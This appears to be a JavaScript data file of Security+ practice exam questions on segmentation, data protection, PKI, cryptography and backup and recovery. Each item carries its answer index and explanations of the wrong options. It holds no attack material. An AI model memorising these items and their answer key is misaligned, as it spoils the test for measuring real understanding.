  { id:"D3-039", domain:3, obj:"3.2", diff:"hard", q:"A passive IDS sensor monitoring a SPAN/mirror port has a key limitation compared to an inline IPS. What is it?", options:["It can detect but cannot block malicious traffic in real time","It encrypts all monitored traffic","It must be the default gateway","It cannot generate any alerts"], answer:0, explain:"<strong>It can detect but cannot block malicious traffic in real time</strong> is the key limitation of a passive IDS on a mirror port, since it only sees copied traffic.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It cannot generate any alerts</b>: a passive IDS does generate alerts; detection and alerting are exactly what it does.</span><span class='qd'><b>It encrypts all monitored traffic</b>: an IDS observes traffic and does not encrypt it.</span><span class='qd'><b>It must be the default gateway</b>: a passive sensor sits out of band on a SPAN port and is not in the routing path or gateway.</span>" },
  { id:"D3-040", domain:3, obj:"3.2", diff:"medium", q:"Network segmentation into security zones primarily helps by:", options:["Increasing broadcast traffic everywhere","Limiting lateral movement and containing breaches to a smaller area","Removing the need for authentication","Guaranteeing zero downtime"], answer:1, explain:"<strong>Limiting lateral movement and containing breaches to a smaller area</strong> is the primary security benefit of segmenting a network into zones.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Increasing broadcast traffic everywhere</b>: segmentation reduces broadcast domains rather than increasing broadcast traffic.</span><span class='qd'><b>Removing the need for authentication</b>: segmentation complements authentication and never removes the need for it.</span><span class='qd'><b>Guaranteeing zero downtime</b>: segmentation contains breaches but does not guarantee availability or zero downtime.</span>" },
  { id:"D3-041", domain:3, obj:"3.2", diff:"easy", q:"Which device is BEST suited to evenly distribute incoming web requests across multiple backend servers?", options:["Print server","KVM switch","Load balancer","Tape library"], answer:2, explain:"<strong>Load balancer</strong> distributes incoming web requests across a pool of backend servers to improve availability, scalability, and performance.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Tape library</b>: a tape library stores backup media and performs no request distribution.</span><span class='qd'><b>Print server</b>: a print server manages print jobs, not web request distribution.</span><span class='qd'><b>KVM switch</b>: a KVM switch shares a keyboard, video, and mouse across machines, unrelated to balancing network traffic.</span>" },
  { id:"D3-042", domain:3, obj:"3.2", diff:"hard", q:"An organization wants TLS-encrypted traffic inspected for malware before it reaches internal users, while preserving the ability to log decisions. Which capability MUST the security device support?", options:["Disabling all encryption on the network","Routing all traffic around the inspection point","Plaintext-only inspection","TLS decryption (SSL/TLS inspection) with re-encryption"], answer:3, explain:"<strong>TLS decryption (SSL/TLS inspection) with re-encryption</strong> is required to scan encrypted traffic for malware, decrypting, inspecting, then re-encrypting the flow.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Plaintext-only inspection</b>: plaintext-only inspection cannot read TLS-encrypted content, so threats stay hidden.</span><span class='qd'><b>Disabling all encryption on the network</b>: disabling encryption destroys confidentiality and is not a viable inspection method.</span><span class='qd'><b>Routing all traffic around the inspection point</b>: bypassing the inspection device means no scanning occurs at all.</span>" },
  { id:"D3-043", domain:3, obj:"3.2", diff:"medium", q:"A stateful firewall improves on a simple stateless packet filter by:", options:["Tracking the state of active connections and allowing return traffic for established sessions","Only filtering based on time of day","Blocking all outbound traffic permanently","Ignoring the connection state entirely"], answer:0, explain:"<strong>Tracking the state of active connections and allowing return traffic for established sessions</strong> is how a stateful firewall improves on a stateless packet filter.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Ignoring the connection state entirely</b>: ignoring state describes a stateless filter, the very thing being improved upon.</span><span class='qd'><b>Only filtering based on time of day</b>: time-based rules are a niche feature, not the defining stateful improvement.</span><span class='qd'><b>Blocking all outbound traffic permanently</b>: blocking all outbound traffic would break connectivity and is not what statefulness means.</span>" },
  { id:"D3-044", domain:3, obj:"3.2", diff:"medium", q:"Why is placing public-facing web servers in a screened subnet (DMZ) preferable to placing them directly on the internal LAN?", options:["It gives them faster internet speeds","A compromise of the exposed server does not directly grant access to internal trusted systems","It removes the need to patch them","It allows them to skip authentication"], answer:1, explain:"<strong>A compromise of the exposed server does not directly grant access to internal trusted systems</strong> is why a DMZ is preferable, keeping breached public servers separated from the internal LAN.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It gives them faster internet speeds</b>: DMZ placement is about isolation, not bandwidth or speed.</span><span class='qd'><b>It removes the need to patch them</b>: DMZ servers still require patching; isolation does not eliminate maintenance.</span><span class='qd'><b>It allows them to skip authentication</b>: a DMZ does not bypass authentication requirements for the servers it hosts.</span>" },
  { id:"D3-045", domain:3, obj:"3.2", diff:"hard", q:"A retailer must keep its payment processing segment separated from its general corporate network to limit regulatory scope and reduce risk. Which control MOST directly achieves this?", options:["Using longer user passwords","Installing more antivirus on workstations","Network segmentation with firewalled zones isolating the payment environment","Increasing the office Wi-Fi range"], answer:2, explain:"<strong>Network segmentation with firewalled zones isolating the payment environment</strong> most directly separates payment processing to limit regulatory scope and contain risk.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Installing more antivirus on workstations</b>: endpoint antivirus does not separate the payment segment from the corporate network.</span><span class='qd'><b>Increasing the office Wi-Fi range</b>: extending Wi-Fi coverage has no effect on isolating the cardholder environment.</span><span class='qd'><b>Using longer user passwords</b>: stronger passwords improve authentication but do not segment or isolate networks.</span>" }
);
SECPLUS.questions.push(
  { id:"D3-046", domain:3, obj:"3.3", diff:"easy", q:"Which term describes data that is actively being processed in a system's RAM or CPU registers?", options:["Data in archive","Data at rest","Data in transit","Data in use"], answer:3, explain:"<strong>Data in use</strong> is information actively being processed in RAM or CPU registers, often protected with techniques like encrypted memory or secure enclaves.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data at rest</b>: data at rest is stored on disk or media, not actively being processed in memory.</span><span class='qd'><b>Data in transit</b>: data in transit is moving across a network, not residing in CPU registers or RAM for processing.</span><span class='qd'><b>Data in archive</b>: archived data is a form of stored data at rest, not data being actively processed.</span>" },
  { id:"D3-047", domain:3, obj:"3.3", diff:"easy", q:"Which encryption approach is MOST appropriate for protecting data in transit across a public network?", options:["TLS","File-level encryption at rest","Tape encryption","Full-disk encryption"], answer:0, explain:"<strong>TLS</strong> encrypts data while it moves between endpoints over a network, making it the appropriate control for data in transit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Full-disk encryption</b>: full-disk encryption protects data at rest on a drive, not data crossing a network.</span><span class='qd'><b>File-level encryption at rest</b>: file-level encryption secures stored files, not the transmission of data over a public network.</span><span class='qd'><b>Tape encryption</b>: tape encryption protects backup media at rest, not network communications.</span>" },
  { id:"D3-048", domain:3, obj:"3.3", diff:"easy", q:"What data protection technique replaces sensitive values with non-sensitive substitute values stored in a separate secure vault?", options:["Hashing","Tokenization","Compression","Steganography"], answer:1, explain:"<strong>Tokenization</strong> replaces a sensitive value with a non-sensitive token that maps back to the original only through a secure vault, common in payment processing.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hashing</b>: hashing is a one-way function with no vault mapping back to the original value, so it is not reversible substitution.</span><span class='qd'><b>Compression</b>: compression reduces data size for storage or transfer and provides no security substitution.</span><span class='qd'><b>Steganography</b>: steganography hides data inside other data, it does not substitute values stored in a secure vault.</span>" },
  { id:"D3-049", domain:3, obj:"3.3", diff:"medium", q:"A company wants to allow developers to use realistic-looking customer records in a test database without exposing real PII. Which technique BEST achieves this?", options:["Key escrow","Load balancing","Data masking","Disk encryption"], answer:2, explain:"<strong>Data masking</strong> replaces real data with structurally similar but fictitious values, keeping test data realistic without exposing real PII.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disk encryption</b>: encryption protects data at rest but the decrypted records would still expose real PII to developers.</span><span class='qd'><b>Key escrow</b>: key escrow stores recovery copies of cryptographic keys and does not produce realistic fake test data.</span><span class='qd'><b>Load balancing</b>: load balancing distributes traffic across servers and has nothing to do with protecting test data.</span>" },
  { id:"D3-050", domain:3, obj:"3.3", diff:"medium", q:"Which concept refers to the principle that data is subject to the laws of the country in which it is physically stored?", options:["Data masking","Data tokenization","Data classification","Data sovereignty"], answer:3, explain:"<strong>Data sovereignty</strong> means data is governed by the laws of the country where it physically resides, which influences cloud storage region choices.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data classification</b>: classification assigns sensitivity labels to data, not jurisdiction over where it is stored.</span><span class='qd'><b>Data masking</b>: masking hides real values for safe use, unrelated to legal jurisdiction.</span><span class='qd'><b>Data tokenization</b>: tokenization substitutes values via a vault and does not address which country's laws apply.</span>" },
  { id:"D3-051", domain:3, obj:"3.3", diff:"medium", q:"An organization labels documents as Public, Internal, Confidential, and Restricted. This practice is BEST described as which of the following?", options:["Data classification","Data obfuscation","Data sovereignty","Data tokenization"], answer:0, explain:"<strong>Data classification</strong> assigns sensitivity labels such as Public, Internal, Confidential, and Restricted so appropriate handling controls can be applied.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data tokenization</b>: tokenization substitutes sensitive values with tokens, not labels indicating sensitivity.</span><span class='qd'><b>Data obfuscation</b>: obfuscation obscures the meaning of data, whereas labeling categorizes its sensitivity.</span><span class='qd'><b>Data sovereignty</b>: sovereignty concerns legal jurisdiction over data location, not applying sensitivity labels.</span>" },
  { id:"D3-052", domain:3, obj:"3.3", diff:"medium", q:"A DLP system blocks an email containing a 16-digit number matching a credit card pattern from leaving the network. Which DLP capability is being demonstrated?", options:["Endpoint encryption","Content inspection and pattern matching","Network segmentation","Key rotation"], answer:1, explain:"<strong>Content inspection and pattern matching</strong> is the DLP capability shown, using patterns like a 16-digit card regex to detect and block sensitive data leaving the network.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Endpoint encryption</b>: encryption protects stored data but does not inspect email content to match a card pattern.</span><span class='qd'><b>Network segmentation</b>: segmentation isolates network zones and does not scan message content for sensitive patterns.</span><span class='qd'><b>Key rotation</b>: rotating cryptographic keys is a key-management task unrelated to inspecting outbound content.</span>" },
  { id:"D3-053", domain:3, obj:"3.3", diff:"hard", q:"A retailer must store payment data but wants to remove cardholder data from most of its environment to reduce PCI DSS scope while still supporting recurring billing. Which approach is the BEST fit?", options:["Mask the card numbers everywhere they appear","Encrypt the card numbers with AES and keep them in every application","Tokenize the card numbers and store tokens in applications","Hash the card numbers with SHA-256 in every system"], answer:2, explain:"<strong>Tokenize the card numbers and store tokens in applications</strong> removes actual cardholder data from systems, shrinking PCI scope while the token vault still supports recurring billing.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypt the card numbers with AES and keep them in every application</b>: encrypted card data is still in scope as cardholder data in every application, so it does not shrink scope.</span><span class='qd'><b>Hash the card numbers with SHA-256 in every system</b>: hashing is one-way, so the card number cannot be recovered for recurring billing.</span><span class='qd'><b>Mask the card numbers everywhere they appear</b>: masking only hides display digits while the underlying sensitive data often remains, so it does not remove data from scope.</span>" },
  { id:"D3-054", domain:3, obj:"3.3", diff:"hard", q:"An analyst must guarantee that a downloaded file has not been altered in transit but does NOT need confidentiality. Which control MOST directly meets this need?", options:["Tokenizing the file contents","Applying full-disk encryption","Encrypting the file with AES","Comparing a published SHA-256 hash of the file"], answer:3, explain:"<strong>Comparing a published SHA-256 hash of the file</strong> verifies integrity by detecting any change, which is exactly the requirement without needing confidentiality.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypting the file with AES</b>: AES provides confidentiality, not the integrity verification the scenario requires.</span><span class='qd'><b>Tokenizing the file contents</b>: tokenization substitutes sensitive values and does not confirm a file is unaltered.</span><span class='qd'><b>Applying full-disk encryption</b>: full-disk encryption protects stored data confidentiality but does not detect tampering in transit.</span>" },
  { id:"D3-055", domain:3, obj:"3.3", diff:"medium", q:"Using network segmentation to place a sensitive database in its own VLAN with strict ACLs PRIMARILY supports which data protection goal?", options:["Reducing the attack surface and limiting lateral movement","Increasing CPU performance","Eliminating the need for backups","Removing the need for encryption"], answer:0, explain:"<strong>Reducing the attack surface and limiting lateral movement</strong> is the primary goal supported by isolating a sensitive database in its own VLAN with strict ACLs.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Increasing CPU performance</b>: segmentation is a security control and does not improve processor performance.</span><span class='qd'><b>Eliminating the need for backups</b>: isolation does not protect against data loss, so backups remain necessary.</span><span class='qd'><b>Removing the need for encryption</b>: segmentation and encryption are complementary; isolation does not remove the need to encrypt sensitive data.</span>" },
  { id:"D3-056", domain:3, obj:"3.3", diff:"easy", q:"Assigning users only the file-system rights they need to perform their job is an application of which principle?", options:["Implicit deny","Least privilege","Separation of duties","Defense in depth"], answer:1, explain:"<strong>Least privilege</strong> grants users only the minimum file-system rights needed for their job, limiting damage from misuse or compromise.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Separation of duties</b>: separation of duties splits a sensitive task among multiple people, not about minimizing one user's rights.</span><span class='qd'><b>Defense in depth</b>: defense in depth layers multiple controls, a broader strategy than restricting individual permissions.</span><span class='qd'><b>Implicit deny</b>: implicit deny blocks anything not explicitly allowed, which is a rule default rather than the principle of granting minimum needed rights.</span>" },
  { id:"D3-057", domain:3, obj:"3.3", diff:"medium", q:"Which technique makes data unintelligible by deliberately obscuring it, such as scrambling source code or hiding values, without necessarily using a reversible key?", options:["Journaling","Load balancing","Obfuscation","Clustering"], answer:2, explain:"<strong>Obfuscation</strong> deliberately obscures the meaning of data or code, such as scrambling source code, without necessarily using a reversible key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Clustering</b>: clustering links servers for availability and failover, not hiding data meaning.</span><span class='qd'><b>Journaling</b>: journaling logs changes for recovery, it does not obscure data.</span><span class='qd'><b>Load balancing</b>: load balancing distributes traffic across servers and has no role in making data unintelligible.</span>" },
  { id:"D3-058", domain:3, obj:"3.3", diff:"hard", q:"A security team needs to protect data in use within a multi-tenant cloud so that even the cloud provider cannot read it during processing. Which technology is MOST appropriate?", options:["Full-disk encryption","WPA3","TLS 1.3","Confidential computing with trusted execution environments"], answer:3, explain:"<strong>Confidential computing with trusted execution environments</strong> keeps data encrypted even while in use, shielding it from the host and the cloud provider during processing.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>TLS 1.3</b>: TLS protects data in transit, not data being processed in memory.</span><span class='qd'><b>Full-disk encryption</b>: full-disk encryption protects data at rest and decrypts it for processing, leaving data in use exposed.</span><span class='qd'><b>WPA3</b>: WPA3 secures wireless network transmission, not data during computation in the cloud.</span>" },
  { id:"D3-059", domain:3, obj:"3.3", diff:"medium", q:"Which statement BEST distinguishes hashing from encryption?", options:["Encryption is reversible with a key; hashing is a one-way function","Both are one-way functions","Both require a public and private key pair","Hashing is reversible with a key; encryption is not"], answer:0, explain:"<strong>Encryption is reversible with a key; hashing is a one-way function</strong> correctly distinguishes the two, since encryption can be decrypted while hashing cannot be reversed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hashing is reversible with a key; encryption is not</b>: this reverses the truth, as hashing is one-way and encryption is reversible.</span><span class='qd'><b>Both are one-way functions</b>: encryption is intentionally reversible with a key, so it is not one-way.</span><span class='qd'><b>Both require a public and private key pair</b>: symmetric encryption and hashing do not require key pairs, so this is inaccurate.</span>" },
  { id:"D3-060", domain:3, obj:"3.3", diff:"easy", q:"What does a digital signature primarily provide?", options:["Confidentiality only","Authenticity, integrity, and non-repudiation","Availability","Faster encryption"], answer:1, explain:"<strong>Authenticity, integrity, and non-repudiation</strong> are provided by a digital signature, created by signing a hash with the sender's private key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality only</b>: a signature does not encrypt the message, so it provides no confidentiality by itself.</span><span class='qd'><b>Availability</b>: signatures do not address system uptime or availability.</span><span class='qd'><b>Faster encryption</b>: signing adds processing overhead and is not an encryption speed optimization.</span>" },
  { id:"D3-061", domain:3, obj:"3.3", diff:"medium", q:"In public key infrastructure, which entity is responsible for issuing and digitally signing certificates?", options:["Validation authority","Registration authority","Certificate authority","Key escrow agent"], answer:2, explain:"<strong>Certificate authority</strong> issues and digitally signs certificates, binding a public key to an identity in a PKI.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Registration authority</b>: the RA verifies requester identity but does not sign or issue certificates.</span><span class='qd'><b>Key escrow agent</b>: an escrow agent stores key copies for recovery and does not issue certificates.</span><span class='qd'><b>Validation authority</b>: a validation authority confirms certificate status, such as via OCSP, rather than issuing certificates.</span>" },
  { id:"D3-062", domain:3, obj:"3.3", diff:"medium", q:"What is the role of a registration authority (RA) in a PKI?", options:["It stores private keys for recovery","It revokes certificates automatically","It signs all issued certificates","It verifies the identity of requesters before the CA issues a certificate"], answer:3, explain:"<strong>It verifies the identity of requesters before the CA issues a certificate</strong> is the RA's role, handling vetting on behalf of the CA.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It signs all issued certificates</b>: signing certificates is the CA's job, not the RA's.</span><span class='qd'><b>It stores private keys for recovery</b>: key recovery storage is the function of key escrow, not the RA.</span><span class='qd'><b>It revokes certificates automatically</b>: revocation is managed through the CA and CRL/OCSP, not automatically by the RA.</span>" },
  { id:"D3-063", domain:3, obj:"3.3", diff:"easy", q:"Which file does an entity generate and submit to a CA to request a digital certificate?", options:["CSR","OCSP response","HSM token","CRL"], answer:0, explain:"<strong>CSR</strong> (certificate signing request) contains the applicant's public key and identifying information submitted to the CA to request a certificate.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>CRL</b>: a certificate revocation list publishes revoked certificates and is produced by the CA, not submitted to request one.</span><span class='qd'><b>OCSP response</b>: an OCSP response reports a certificate's revocation status, not a request for issuance.</span><span class='qd'><b>HSM token</b>: an HSM is hardware for key protection, not a file submitted to request a certificate.</span>" },
  { id:"D3-064", domain:3, obj:"3.3", diff:"medium", q:"Compared with downloading a full certificate revocation list, what advantage does OCSP provide?", options:["It encrypts the certificate","It allows real-time, per-certificate status checks","It generates the key pair","It escrows the private key"], answer:1, explain:"<strong>It allows real-time, per-certificate status checks</strong> is OCSP's advantage, querying one certificate's revocation status instead of downloading a full CRL.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It encrypts the certificate</b>: OCSP checks revocation status and does not encrypt certificates.</span><span class='qd'><b>It generates the key pair</b>: key generation occurs on the requester or in an HSM, not through OCSP.</span><span class='qd'><b>It escrows the private key</b>: key escrow is a separate recovery function unrelated to revocation status checking.</span>" },
  { id:"D3-065", domain:3, obj:"3.3", diff:"hard", q:"A high-traffic website wants clients to verify its certificate is not revoked without each client contacting the CA, reducing latency and privacy leakage. Which solution BEST addresses this?", options:["Using a self-signed certificate","Publishing a larger CRL","OCSP stapling","Disabling revocation checking"], answer:2, explain:"<strong>OCSP stapling</strong> has the web server attach a time-stamped OCSP response during the TLS handshake, so clients verify revocation without contacting the CA themselves.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Publishing a larger CRL</b>: a bigger CRL increases download size and latency, the opposite of the goal.</span><span class='qd'><b>Disabling revocation checking</b>: turning off revocation checking removes security rather than addressing latency safely.</span><span class='qd'><b>Using a self-signed certificate</b>: a self-signed certificate is untrusted by clients and does not solve revocation verification.</span>" },
  { id:"D3-066", domain:3, obj:"3.3", diff:"medium", q:"What is the primary purpose of key escrow?", options:["To replace certificate authorities","To generate random numbers","To accelerate encryption","To store a copy of cryptographic keys so data can be recovered if keys are lost"], answer:3, explain:"<strong>To store a copy of cryptographic keys so data can be recovered if keys are lost</strong> is the primary purpose of key escrow, held by a trusted party.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To accelerate encryption</b>: escrow concerns key recovery, not cryptographic performance.</span><span class='qd'><b>To replace certificate authorities</b>: escrow stores keys and does not perform the CA's issuing and signing role.</span><span class='qd'><b>To generate random numbers</b>: random number generation is a separate cryptographic primitive unrelated to key escrow.</span>" },
  { id:"D3-067", domain:3, obj:"3.3", diff:"medium", q:"Which dedicated hardware device is designed to generate, store, and manage cryptographic keys with tamper resistance for enterprise use?", options:["HSM","NIC","UPS","TPM"], answer:0, explain:"<strong>HSM</strong> (hardware security module) is a dedicated, tamper-resistant appliance for enterprise key generation, storage, and cryptographic operations.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>TPM</b>: a TPM is a chip bound to a single host for that device's keys and integrity, not a dedicated enterprise-wide key appliance.</span><span class='qd'><b>NIC</b>: a network interface card handles network connectivity, not key management.</span><span class='qd'><b>UPS</b>: an uninterruptible power supply provides backup power and has no cryptographic function.</span>" },
  { id:"D3-068", domain:3, obj:"3.3", diff:"medium", q:"A TPM chip on a laptop is MOST commonly used to support which function?", options:["Routing network traffic","Storing keys to enable full-disk encryption and platform integrity checks","Load balancing web requests","Providing battery backup"], answer:1, explain:"<strong>Storing keys to enable full-disk encryption and platform integrity checks</strong> is the most common TPM use, binding encryption to the device and verifying boot integrity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Routing network traffic</b>: traffic routing is a network device function, not a TPM role.</span><span class='qd'><b>Load balancing web requests</b>: load balancing is performed by dedicated appliances, not a motherboard security chip.</span><span class='qd'><b>Providing battery backup</b>: battery backup is the job of a UPS, unrelated to the TPM.</span>" },
  { id:"D3-069", domain:3, obj:"3.3", diff:"easy", q:"Which algorithm is a symmetric block cipher widely used to encrypt data at rest?", options:["SHA-256","RSA","AES","ECC"], answer:2, explain:"<strong>AES</strong> is a symmetric block cipher widely used to encrypt data at rest and in transit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>RSA</b>: RSA is an asymmetric algorithm used for key exchange and signatures, not a symmetric block cipher.</span><span class='qd'><b>ECC</b>: ECC is asymmetric elliptic curve cryptography, not a symmetric block cipher.</span><span class='qd'><b>SHA-256</b>: SHA-256 is a one-way hash function, not an encryption cipher.</span>" },
  { id:"D3-070", domain:3, obj:"3.3", diff:"medium", q:"Why is ECC often preferred over RSA for mobile and IoT devices?", options:["ECC is a hashing algorithm","ECC does not use mathematics","ECC requires no keys","ECC provides comparable security with smaller key sizes and lower computational overhead"], answer:3, explain:"<strong>ECC provides comparable security with smaller key sizes and lower computational overhead</strong>, making it efficient for resource-constrained mobile and IoT devices.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>ECC requires no keys</b>: ECC is key-based cryptography; it absolutely uses keys.</span><span class='qd'><b>ECC is a hashing algorithm</b>: ECC is an asymmetric encryption and signature scheme, not a hash function.</span><span class='qd'><b>ECC does not use mathematics</b>: ECC is grounded in elliptic curve mathematics, so this is false.</span>" },
  { id:"D3-071", domain:3, obj:"3.3", diff:"hard", q:"Two parties need to establish a shared symmetric key over an untrusted network without ever transmitting the key itself. Which mechanism BEST accomplishes this?", options:["Diffie-Hellman key exchange","SHA-512 hashing","Data masking","CRL distribution"], answer:0, explain:"<strong>Diffie-Hellman key exchange</strong> lets two parties derive a shared secret over an insecure channel without ever transmitting the key itself.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SHA-512 hashing</b>: hashing produces a one-way digest and cannot establish a shared secret key.</span><span class='qd'><b>Data masking</b>: masking hides real data values and has no role in key agreement.</span><span class='qd'><b>CRL distribution</b>: distributing a revocation list reports certificate status, not negotiating a shared key.</span>" },
  { id:"D3-072", domain:3, obj:"3.3", diff:"medium", q:"Which construct combines a hash function with a secret key to provide both integrity and authentication of a message?", options:["OCSP","HMAC","CRL","CSR"], answer:1, explain:"<strong>HMAC</strong> combines a hash function with a secret key to provide both message integrity and authentication.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>CRL</b>: a certificate revocation list lists revoked certificates and does not authenticate messages.</span><span class='qd'><b>CSR</b>: a certificate signing request asks a CA to issue a certificate, unrelated to message authentication.</span><span class='qd'><b>OCSP</b>: OCSP checks certificate revocation status, not the integrity and authenticity of a message.</span>" },
  { id:"D3-073", domain:3, obj:"3.3", diff:"hard", q:"An administrator must choose a key length and algorithm that resists brute force while remaining standard for government-grade data at rest. Which choice is MOST appropriate?", options:["ROT13 substitution","DES with 56-bit keys","AES with 256-bit keys","MD5 hashing"], answer:2, explain:"<strong>AES with 256-bit keys</strong> is a current standard offering strong brute-force resistance for government-grade data at rest.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DES with 56-bit keys</b>: DES is deprecated and its 56-bit key is trivially brute-forced today.</span><span class='qd'><b>MD5 hashing</b>: MD5 is a weak, collision-prone hash and is not an encryption algorithm for protecting data.</span><span class='qd'><b>ROT13 substitution</b>: ROT13 is trivial obfuscation with no real cryptographic strength.</span>" },
  { id:"D3-074", domain:3, obj:"3.3", diff:"hard", q:"During a PKI compromise, a CA's private signing key is suspected stolen. What is the MOST important immediate action?", options:["Increase the key length on new requests","Switch to symmetric encryption","Issue more certificates faster","Revoke the affected certificates and update the CRL/OCSP"], answer:3, explain:"<strong>Revoke the affected certificates and update the CRL/OCSP</strong> is the most important immediate action so relying parties stop trusting compromised certificates.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Issue more certificates faster</b>: issuing more certificates from a compromised CA spreads risk rather than containing it.</span><span class='qd'><b>Increase the key length on new requests</b>: longer keys on future certificates does nothing about the already-trusted compromised ones.</span><span class='qd'><b>Switch to symmetric encryption</b>: changing encryption type does not address revoking the affected PKI certificates.</span>" },
  { id:"D3-075", domain:3, obj:"3.3", diff:"medium", q:"Which stage of the certificate lifecycle removes a certificate from trust before its scheduled expiration?", options:["Revocation","Renewal","Generation","Enrollment"], answer:0, explain:"<strong>Revocation</strong> removes a certificate from trust before its scheduled expiration, for example after a key compromise or employee departure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Enrollment</b>: enrollment is the initial issuance stage, not the removal of trust.</span><span class='qd'><b>Renewal</b>: renewal extends a certificate's validity, the opposite of removing it from trust.</span><span class='qd'><b>Generation</b>: generation creates the key pair and certificate, not invalidating one early.</span>" },
  { id:"D3-076", domain:3, obj:"3.4", diff:"easy", q:"What is the primary goal of high availability (HA)?", options:["Reducing storage costs","Minimizing downtime so services remain accessible","Encrypting all data","Eliminating the need for backups"], answer:1, explain:"<strong>Minimizing downtime so services remain accessible</strong> is the primary goal of high availability, achieved through redundancy and failover.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reducing storage costs</b>: cost reduction is not the aim of HA, which often adds cost through redundancy.</span><span class='qd'><b>Encrypting all data</b>: encryption addresses confidentiality, not availability and uptime.</span><span class='qd'><b>Eliminating the need for backups</b>: HA protects uptime but does not replace backups for data recovery.</span>" },
  { id:"D3-077", domain:3, obj:"3.4", diff:"medium", q:"Which statement BEST distinguishes clustering from load balancing?", options:["Clustering only applies to storage","They are identical concepts","Clustering links servers to act as one system with failover, while load balancing distributes traffic across servers","Load balancing only works on databases"], answer:2, explain:"<strong>Clustering links servers to act as one system with failover, while load balancing distributes traffic across servers</strong> correctly distinguishes the two concepts.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They are identical concepts</b>: clustering and load balancing serve different purposes, so they are not identical.</span><span class='qd'><b>Load balancing only works on databases</b>: load balancing applies broadly to web and application servers, not only databases.</span><span class='qd'><b>Clustering only applies to storage</b>: clustering applies to compute and application servers as well, not just storage.</span>" },
  { id:"D3-078", domain:3, obj:"3.4", diff:"easy", q:"Which recovery site contains fully operational, up-to-date systems that can take over almost immediately?", options:["Mobile site","Cold site","Warm site","Hot site"], answer:3, explain:"<strong>Hot site</strong> is a fully equipped, continuously updated recovery site allowing near-immediate failover, though it is the most expensive option.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Cold site</b>: a cold site has space and power but no ready systems, requiring lengthy setup before use.</span><span class='qd'><b>Warm site</b>: a warm site has hardware in place but needs data restoration and configuration before takeover.</span><span class='qd'><b>Mobile site</b>: a mobile site is a transportable recovery facility, not inherently a fully operational, up-to-date system.</span>" },
  { id:"D3-079", domain:3, obj:"3.4", diff:"medium", q:"An organization has a recovery site with hardware and network connectivity installed but data must be restored and configurations completed before use. This describes which site type?", options:["Warm site","Cold site","Cloud site","Hot site"], answer:0, explain:"<strong>Warm site</strong> has hardware and connectivity installed but requires data restoration and final configuration, balancing cost and recovery time.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hot site</b>: a hot site is already fully operational and up to date, needing no restoration before takeover.</span><span class='qd'><b>Cold site</b>: a cold site provides only space and power without the installed hardware and connectivity described.</span><span class='qd'><b>Cloud site</b>: a cloud site is a recovery option in the cloud, not the specific warm description of installed-but-unconfigured hardware.</span>" },
  { id:"D3-080", domain:3, obj:"3.4", diff:"easy", q:"Which backup type captures only the data that has changed since the last FULL backup, and is not reset by intermediate backups?", options:["Incremental","Differential","Snapshot","Mirror"], answer:1, explain:"<strong>Differential</strong> backups capture all data changed since the last full backup and are not reset by intermediate backups, growing until the next full.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Incremental</b>: incremental captures changes since the last backup of any type and is reset by each backup, unlike a differential.</span><span class='qd'><b>Snapshot</b>: a snapshot captures point-in-time state, not specifically changes since the last full backup.</span><span class='qd'><b>Mirror</b>: a mirror maintains a real-time duplicate copy, not a record of changes since the last full backup.</span>" },
  { id:"D3-081", domain:3, obj:"3.4", diff:"medium", q:"Which backup strategy results in the FASTEST backup time but the slowest restore, because each backup only captures changes since the previous backup of any type?", options:["Full","Differential","Incremental","Snapshot"], answer:2, explain:"<strong>Incremental</strong> backups capture only changes since the last backup of any type, making them fastest to create but slowest to restore.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Full</b>: a full backup copies everything, so it is the slowest to create, not the fastest.</span><span class='qd'><b>Differential</b>: a differential captures changes since the last full and restores faster than incremental, since only one differential plus the full is needed.</span><span class='qd'><b>Snapshot</b>: a snapshot is a point-in-time state capture, not the chained change-only strategy described.</span>" },
